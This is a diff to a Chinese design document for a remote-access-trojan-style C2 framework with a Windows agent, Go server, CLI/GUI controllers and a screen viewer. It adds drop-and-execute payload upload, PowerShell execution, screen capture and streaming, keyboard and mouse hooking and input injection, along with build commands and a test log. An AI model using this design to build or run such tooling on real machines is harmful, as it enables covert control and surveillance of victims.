@@ -29,19 +29,20 @@
 └───────┬──────────────────────────┬─────────────────┘
         │ TCP 4444                 │ TCP 4444
         ▼                          ▼
-┌─ ratctl.exe (Go) ──┐   ┌─ im_ctl.exe (C++ ImGui) ─┐
-│ 交互式 shell        │   │ GUI：会话/命令/屏幕显示    │
-│ sessions/use/sysinfo│   │ + 键鼠 hook（输入回放）    │
-│ /exec/back/exit     │   │ + Docking                │
-└─────────────────────┘   └──────────────────────────┘
+┌─ ratctl.exe (Go) ──┐   ┌─ im_ctl.exe (C++ ImGui) ─┐   ┌─ viewer.exe (C++ Win32) ─┐
+│ 交互式 shell        │   │ GUI：会话/命令/屏幕显示    │   │ 由 ratctl screen 命令拉起  │
+│ sessions/use/sysinfo│   │ + 键鼠 hook（输入回放）    │   │ 建流 + 显示 + 键鼠注入     │
+│ /exec/screen/payload│   │ + Docking                │   │ 无 ImGui/OpenGL 依赖      │
+└─────────────────────┘   └──────────────────────────┘   └──────────────────────────┘
 ```
 
 | 端 | 语言 | 默认信道 | 角色 |
 |---|---|---|---|
-| RatAgent | C++ (Windows) | TCP 4444 长连接（`run_agent`）；beacon HTTP 8080 备选（`run_beacon`） | 被控端：抓屏/执行命令/注入输入 |
+| RatAgent | C++ (Windows) | TCP 4444 长连接（`run_agent`）；beacon HTTP 8080 备选（`run_beacon`） | 被控端：抓屏/执行命令/注入输入/落盘执行 payload |
 | c2server | Go | 监听 4444/8080/4445 | C2 中枢：会话/中继/转发 |
-| ratctl | Go | TCP 4444 | 控制端（CLI） |
+| ratctl | Go | TCP 4444 | 控制端（CLI）：会话/系统/截屏/拉起 viewer/payload |
 | im_ctl | C++ (ImGui) | TCP 4444 | 控制端（GUI） |
+| viewer | C++ (Win32) | TCP 4444 | 控制端（屏幕流查看器，由 ratctl 拉起） |
 
 ---
 
@@ -75,11 +76,15 @@
 | | 0x0106 | CmdBye | 下线 |
 | 业务 | 0x3001 | SysInfo | 系统信息（OS/CPU/内存/磁盘/主机名） |
 | | 0x3008 | ExecPs | PowerShell 执行 |
-| | 0x1002 | ScreenStream | 屏幕流控制（beacon/长连接下发：control+fps+quality） |
+| | 0x3009 | Payload | payload 分块上传 → `%TEMP%\c2_payload\` → CreateProcess 执行（协议 §10） |
+| | 0x1001 | Screenshot | 单帧截屏（响应为 JPEG 原始字节） |
+| | 0x1002 | ScreenStream | 屏幕流控制（beacon/长连接下发：control+fps+quality+scale） |
 | 屏幕流 | 0x0501/02 | StreamHello/Ack | 4445 握手（明文） |
 | | 0x0503 | ScreenFrame | 帧包（seq+w+h+jpeg_len+JPEG，stream_key 加密） |
 | | 0x0504 | InputEvents | 输入事件（agent_id+count+InputEvent[24B]） |
 | 管理 | 0x4001 | CtlList | 会话列表（ctl→C2 本地） |
+| | 0x4002 | CtlKillSession | 踢会话下线（ctl→C2 本地） |
+| | 0x4003 | CtlGetSession | 单会话详情（ctl→C2 本地，payload = agent_id 的 hex 字符串） |
 
 ### 2.3 防重放（协议 §4.1）
 
@@ -140,7 +145,7 @@
 |---|---|
 | `main.cpp` | 默认入口 `run_agent`（TCP 4444 长连接：握手/心跳/读包分发）；`run_beacon`（HTTP 轮询备选）；`agent.id` 持久化 |
 | `session` | 握手、心跳线程（15s，seq 递增） |
-| `cmd_dispatch` | 命令分发中心：SysInfo（RtlGetVersion/GlobalMemoryStatusEx/GetDiskFreeSpaceEx）、ExecPs（CreateProcess powershell + 管道捕获 + 30s 超时）、ScreenStream 控制 |
+| `cmd_dispatch` | 命令分发中心：SysInfo（RtlGetVersion/GlobalMemoryStatusEx/GetDiskFreeSpaceEx）、ExecPs（CreateProcess powershell + 管道捕获 + 120s 超时）、ScreenStream 控制、Screenshot（GDI 抓帧 + WIC JPEG）、Payload（分块落盘 `%TEMP%\c2_payload\` + CreateProcess 执行） |
 | `screen_spy` | GDI 抓屏（虚拟屏幕/DPI/区域/全分辨率） |
 | `screen_stream` | 4445 连接线程：握手 → 帧循环（抓屏+WIC JPEG+加密上行，25fps）+ 输入接收（SendInput 注入）；start/stop 线程管理 |
 | `input_replay`/`desktop_switch` | 注入实现（WM_* 映射、坐标换算、活动桌面切换） |
@@ -148,10 +153,22 @@
 
 ### 4.3 控制端
 
-**ratctl（Go，`ctl/cmd/ratctl`）** —— 交互式 shell：
+**ratctl（Go，`ctl/cmd/ratctl/`）** —— 交互式 shell：
 - 单条 ctl 长连接 + 后台读线程（解密/防重放/按 seq 分发）
 - `sendAndWait`（240s 超时）、指令 seq 全局递增
-- 命令：`sessions / use(前缀匹配) / back / sysinfo / exec / help / exit`，提示符 `ratctl[agent]>`
+- 会话：`sessions / use(前缀匹配) / back / session <id> 详情 / kill <id>`
+- 业务：`sysinfo / exec / screenshot [id] <file> / payload <file> [name] [--args <参数>]`
+- 远控：`screen [id] [fps] [quality] [scale]`（拉起 viewer）、`stop`（停流兜底）
+- 提示符 `ratctl[agent]>`
+
+**viewer（C++ Win32，`viewer/`）** —— 轻量远控查看器：
+- 复用 `im_ctl/ctl_client.cpp`（CONTROL 客户端：连接/握手/业务/输入事件）与 `client/core` 协议栈
+- 无 ImGui/OpenGL 依赖：Win32 窗口 + `StretchDIBits` 显示，WIC 解码 JPEG
+- **由 viewer 自己发起 0x1002**：C2 按"发起流请求的那条 ctl 连接"配对转发帧，
+  因此 ratctl 的 `screen` 只负责拉起进程并透传 `-s/-a/-fps/-quality/-scale`
+- 键鼠：WH_MOUSE_LL/WH_KEYBOARD_LL 采集 → 图像矩形内坐标换算 → 0x0504
+- 退出：窗口关闭时发 0x1002 control=0；启动未完成则跳过（用 `ratctl stop` 兜底）
+- 启动/停止都用"不等待回执"发送（`screenStream(..., wait=false)`），避免退出时来不及停流
 
 **im_ctl（C++ ImGui，`im_ctl`）** —— GUI 控制端：
 - 复用 `client/core` 协议栈（protocol/crypto/net），`ctl_client`（CONTROL 客户端：连接/读线程/sendAndWait/业务命令/屏幕流/输入事件）
@@ -217,6 +234,7 @@ c2/
 ├── ctl/cmd/ratctl/    # Go 交互式 shell
 ├── client/core/       # C++ Agent 全部模块
 ├── im_ctl/            # C++ ImGui 控制端（external: imgui/glad/glfw）
+├── viewer/            # C++ Win32 远控查看器（独立 CMake 工程）
 └── scripts/           # e2e_m1~m4（m4 为屏幕流验收）+ ctl_stream_probe
 ```
 
@@ -229,7 +247,19 @@ GO="C:/Users/202603/.g/go/bin/go.exe"
 # Agent（MSBuild）+ im_ctl（CMake）
 MSBUILD ... client/RatAgent.vcxproj -p:Configuration=Debug -p:Platform=x64
 cmake --build im_ctl/build --config Debug
+# viewer（CMake，独立工程；输出 <build>/bin/viewer.exe）
+cmake -S viewer -B viewer/build && cmake --build viewer/build --config Debug
 ```
+
+> 无 GUI/受限环境下（例如沙箱会话）可把构建输出改到工作区内新目录，避开已存在的
+> VS 输出目录（其 ACL 可能禁止写入）：
+> ```bash
+> MSBUILD client/RatAgent.vcxproj -p:Configuration=Debug -p:Platform=x64 \
+>   -p:IntDir=<repo>/build/agent/obj/ -p:OutDir=<repo>/build/agent/bin/
+> GOCACHE=<repo>/.gocache go build -o build/bin/ratctl.exe ./ctl/cmd/ratctl
+> cmake -S viewer -B build/viewer && cmake --build build/viewer --config Debug
+> ```
+> `build/`、`.gocache/`、`bin/` 均已在 `.gitignore` 中忽略。
 
 ## 8. 验证
 
@@ -238,10 +268,33 @@ python scripts/e2e_m4.py   # 屏幕流全链路（长连接 agent + probe：帧 
 python scripts/e2e_m3.py   # beacon 轮询 + 交互式 ratctl
 ```
 
+### 8.1 本轮人工端到端验证记录（beacon agent + ratctl + viewer）
+
+环境：`c2server.exe` + `RatAgent.exe 127.0.0.1 8080 -s 5`（beacon 信道）+ `ratctl`（脚本化 stdin）。
+
+| 项 | 命令 | 结果 |
+|---|---|---|
+| 会话列表/详情 | `sessions` / `session <id>` | ✅ agent 上线，详情字段正确 |
+| 系统信息 | `sysinfo` | ✅ OS/CPU/内存/磁盘/主机名/显卡 |
+| 截屏 | `screenshot <id> shot.jpg` | ✅ 257153 字节 JPEG（`FF D8 FF E0`），未做人工查看 |
+| payload 上传执行 | `payload C:\Windows\System32\cmd.exe cmd_probe.exe --args /c echo payload-ok > ...` | ✅ 2 块（289792B）→ `executed pid=6924`，标记文件内容 `payload-ok` |
+| 屏幕流 + viewer | `screen <id> 25 70 50` | ✅ viewer 拉起 → 0x1002 → agent 连 4445（paired=true）→ 190 帧（1280×720，scale=50%） |
+| 输入下发 | viewer 钩子采集 | ✅ C2 日志 `recv 0x0504` + `relayed input events` |
+| 正常停流 | 关闭 viewer 窗口 | ✅ 发 0x1002 control=0 → `[stream] removed stream connection` |
+| 兜底停流 | `stop` | ✅ `screen stream stopped` → agent 断开 4445 |
+| 踢下线 | `kill <id>` | ✅ 返回 OK（beacon 会话无 TCP 可关，见 §9） |
+
 ## 9. 已知限制与待办
 
 - im_ctl 输入回放需 GUI 手动端到端确认
 - e2e_m1/m2 为直连模型历史脚本（可归档）
-- 协议 §9.3 文档补"ctl→C2 输入事件带 agent_id 前缀"
+- **`kill <id>` 对 beacon 会话不生效**：beacon 会话没有 TCP 连接可关（`session.Close()` 空操作），
+  实际下线依赖 3×sleeptime 离线判定；要真正移除会话需服务端补"beacon 会话标记下线并删除"
+- **payload 落盘不做随机化/自清理**：固定 `%TEMP%\c2_payload\<name>`，同名覆盖；
+  需要"一次一清"的话应在后续版本加清理策略
+- **viewer 被强杀不会停流**：异常退出（任务管理器/`taskkill /F`）不会发送 control=0，
+  需 `ratctl stop` 兜底（正常关窗会自动停流）
+- **viewer 输入策略**：鼠标仅图像矩形内下发，键盘仅 viewer 为前台窗口时下发；
+  本机注入事件被 `LL*HF_INJECTED` 过滤，不会回环
 - 正式化：PSK 外部化、帧率/质量参数生效、多显示器区域配置
 - `im_ctl/external/imgui` 为内嵌 git 仓库（gitlink），clone 需单独处理
